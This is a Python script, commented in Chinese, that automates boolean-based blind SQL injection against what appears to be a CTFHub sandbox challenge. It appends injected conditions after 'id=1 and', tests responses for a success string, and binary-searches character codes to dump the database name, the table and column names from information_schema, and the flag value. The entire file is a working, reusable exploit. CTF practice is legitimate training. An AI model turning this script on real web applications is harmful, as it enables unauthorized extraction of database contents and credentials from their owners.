import requests
import string

# 配置信息
URL = "http://challenge-0a8832eda8b07965.sandbox.ctfhub.com:10800/"
SUCCESS_MARK = "query_success"

def req(cmd) -> bool:
    # 构造完整的 URL，注意 id=1 后的空格
    target_url = f"{URL}?id=1 and {cmd}"
    try:
        response = requests.get(target_url, timeout=5)
        if SUCCESS_MARK in response.content.decode():
            return True
    except Exception as e:
        print(f"\n[!] Request Error: {e}")
    return False

def dump_length(sql_query) -> int:
    """通用的长度获取函数"""
    print(f"[*] 正在获取长度...", end="", flush=True)
    length = 1
    while True:
        # 使用 > 号配合循环也可以，或者直接暴力枚举长度（长度通常较小）
        if req(f"length(({sql_query}))={length}"):
            print(f" {length}")
            return length
        length += 1
        if length > 100: return 0 # 安全退出

def binary_search_char(sql_query, pos) -> str:
    """二分法核心逻辑：针对 SQL 查询结果的第 pos 个字符进行爆破"""
    low = 32
    high = 126
    res = 0
    
    while low <= high:
        mid = (low + high) // 2
        # 构造判断语句：提取第 pos 个字符的 ASCII 码，判断是否大于 mid
        # 注意：子查询必须加括号
        condition = f"ascii(substr(({sql_query}),{pos},1))>{mid}"
        
        if req(condition):
            low = mid + 1
            res = low
        else:
            high = mid - 1
            res = mid
            
    return chr(res) if res > 0 else ""

def dump_data(sql_query):
    """通用数据爆破函数"""
    length = dump_length(sql_query)
    if length == 0: return ""
    
    print(f"[*] 正在爆破数据: ", end="", flush=True)
    result = ""
    for i in range(1, length + 1):
        char = binary_search_char(sql_query, i)
        result += char
        print(char, end="", flush=True) # 实时打印字符且不换行
    print() # 换行
    return result

# --- 实战流程 ---

# 1. 获取当前数据库名
current_db = dump_data("database()")
print(f"[+] Database: {current_db}")

# 2. 获取所有表名 (group_concat)
tables_query = f"select group_concat(table_name) from information_schema.tables where table_schema='{current_db}'"
all_tables = dump_data(tables_query)
print(f"[+] Tables: {all_tables}")

# 3. 假设我们要跑 flag 表的字段 (这里你可以手动指定 table_name)
target_table = "flag"
columns_query = f"select group_concat(column_name) from information_schema.columns where table_name='{target_table}'"
all_columns = dump_data(columns_query)
print(f"[+] Columns: {all_columns}")

# 4. 获取最终 flag
target_column = "flag" # 假设字段名也是 flag
flag_query = f"select {target_column} from {current_db}.{target_table} limit 0,1"
final_flag = dump_data(flag_query)

print("-" * 30)
print(f"[!] FINAL FLAG: {final_flag}")